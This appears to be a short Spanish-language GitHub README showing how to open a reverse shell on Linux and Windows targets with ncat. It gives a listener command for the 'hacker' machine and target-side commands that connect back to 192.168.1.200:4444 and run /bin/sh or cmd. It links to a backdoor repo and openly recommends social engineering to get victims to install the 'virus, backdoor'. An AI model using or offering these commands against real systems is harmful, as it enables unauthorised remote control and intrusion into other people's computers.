# REVERSE_SHELL-CON-NCAT

# Infectar un sistema linux y windows.
# Con tan solo 2 lineas de comando !


* LISTENER (HACKER) > PARROT 

```bash
ncat -l -v 4444
```

* TARGET > UBUNTU 

```bash
ncat -v 192.168.1.200 4444 -e "/bin/sh"
```

# Result > ![backdoor](https://user-images.githubusercontent.com/97669969/154819413-fd945688-3170-46e5-995e-46fd7f491333.jpg)


# Windows 

* LISTENER (HACKER) > PARROT

```bash
ncat -l -v 4444
```

* TARGET > WINDOWS 

```bash
ncat -v 192.168.1.200 4444 -e cmd
```
# RESULT >
![windows shell](https://user-images.githubusercontent.com/97669969/154819759-1af4849a-9bc7-4e86-a5e2-42a834a89e58.jpg)





# " La Navaja Suiza " EN ACCION !




* La IP debe ser la tuya. 
* El puerto esta por defecto en 4444. 


# Por supuesto aqui estamos haciendo pruebas de nuestro backdoor. 
* Tenemos que usar un lenguaje y escribir nuestro codigo y crear un archivo executable tanto en linux como en windows.
# El desarrollo del backddor y listener se encuentra en el siguente repo > https://github.com/tmcyberagent/BACKDOOR-LABORATORIO-



* Y por suspuesto > usar ingenieria social para hacer que esa persona instale nuestro virus, backdoor..etc.


